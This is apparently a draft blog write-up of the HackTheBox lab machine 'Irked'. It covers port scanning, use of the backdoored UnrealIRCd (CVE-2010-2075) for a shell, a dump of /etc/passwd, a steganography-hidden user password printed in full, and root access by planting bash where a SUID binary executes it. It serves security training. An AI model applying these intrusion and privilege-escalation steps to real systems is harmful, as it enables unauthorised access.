+++
date = '2026-04-20T22:26:37-04:00'
draft = true
title = 'Irked'
+++

Irked is an easy-rated Linux box on HackTheBox. The path goes through a trojaned UnrealIRCd instance to land a shell, some steganography hidden behind a backup file hint to pivot to a real user, and finally a SUID binary that executes a world-writable script to get root.

---

## Enumeration

### NMAP

```
TARGET: 10.129.26.191
ME: 10.10.14.208
```

I used my standard two-stage NMAP one-liner — fast full-port sweep piped straight into a service/version scan on everything that responded:

```
nmap -sC -sV -p$(nmap -p- -Pn 10.129.26.191 | grep "/tcp\|/udp" | cut -d"/" -f1 | tr "\n" ", ") 10.129.26.191
```

```
Nmap scan report for 10.129.26.191
Host is up (0.028s latency).
Not shown: 65528 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          37341/udp6  status
|   100024  1          52317/udp   status
|   100024  1          56949/tcp   status
|_  100024  1          59956/tcp6  status
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
56949/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd
Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The three IRC ports (6697, 8067, 65534) all running UnrealIRCd immediately stood out. Port 80 had nothing interesting on the surface — just an image with a hint to look at the IRC service. RPCbind on 111 didn't seem like the path here.

When I tried to connect to the IRC service I got back:

```
Throttled: Reconnecting too fast) -Email djmardov@irked.htb for more information.
```

That gave me a username to keep in mind — `djmardov`.

---

## Foothold — Trojaned UnrealIRCd (CVE-2010-2075)

### Identifying the Version

I ran the NMAP IRC scripts against port 6697 to pull more detail on the service:

```bash
nmap --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor -p 6697 10.129.26.191
```

The `irc-unrealircd-backdoor` script confirmed this was the [trojaned version of UnrealIRCd](seclists.org/fulldisclosure/2010/Jun/277) — a backdoored release that was distributed via the official mirrors back in 2010. The backdoor lets an attacker execute arbitrary commands by sending a specially crafted string to the IRC port.

### Exploiting the Backdoor

Found a public exploit for the backdoor and ran it straight against port 6697. It worked without any issues and dropped me a shell as `ircd`.

---

## Shell as ircd

First thing I did was dump `/etc/passwd` to see what users were on the box:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
messagebus:x:104:111::/var/run/dbus:/bin/false
avahi:x:105:112:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
Debian-exim:x:106:114::/var/spool/exim4:/bin/false
statd:x:107:65534::/var/lib/nfs:/bin/false
colord:x:108:118:colord colour management daemon,,,:/var/lib/colord:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
geoclue:x:110:119::/var/lib/geoclue:/bin/false
pulse:x:111:121:PulseAudio daemon,,,:/var/run/pulse:/bin/false
speech-dispatcher:x:112:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
sshd:x:113:65534::/var/run/sshd:/usr/sbin/nologin
rtkit:x:114:123:RealtimeKit,,,:/proc:/bin/false
saned:x:115:124::/var/lib/saned:/bin/false
usbmux:x:116:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
hplip:x:117:7:HPLIP system user,,,:/var/run/hplip:/bin/false
Debian-gdm:x:118:125:Gnome Display Manager:/var/lib/gdm3:/bin/false
djmardov:x:1000:1000:djmardov,,,:/home/djmardov:/bin/bash
ircd:x:1001:1001::/home/ircd:/bin/sh
```

Two interesting interactive users: `djmardov` (uid 1000, the one from the IRC error message) and `ircd` (which I was currently running as). The goal was to move laterally to `djmardov`.

---

## Lateral Movement — ircd → djmardov

### Finding the Steg Hint

Poking around `djmardov`'s home directory, I found a hidden `.backup` file in `Documents`:

```
ircd@irked:/home/djmardov/Documents$ cat .backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

"Super elite steg backup pw" — so there's steganography involved and this is the password. The obvious candidate was the image sitting on port 80. I ran `steghide` against it with this password:

```
steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss
```

That extracted a file containing `djmardov`'s password:

```
Kab6h+m+bbp2J:HG
```

### SSH as djmardov

```
ssh djmardov@10.129.26.191
```

Used the extracted password and got in.

---

## Privilege Escalation — djmardov → root

### Enumerating SUID Binaries

Looking for SUID binaries, I spotted an unusual one: `/usr/bin/viewuser`. Not a standard Linux binary, which meant it was custom and worth investigating.

Running it revealed that it tries to execute `/tmp/listusers`:

```
$ /usr/bin/viewuser
This application is being developed to set and view users' information
Error - suid: Coult not determine current user
```

The binary was calling out to `/tmp/listusers` — and `/tmp` is world-writable. `listusers` didn't exist yet, so I could just create it as anything I wanted.

### Exploiting the SUID Binary

I copied `bash` into `/tmp/listusers` and made sure it was executable:

```bash
cp /bin/bash /tmp/listusers
chmod +x /tmp/listusers
```

When `viewuser` ran `/tmp/listusers`, it executed `bash` with the SUID binary's elevated permissions, dropping me into a root shell.

```
# id
uid=0(root) gid=0(root) groups=0(root)
```
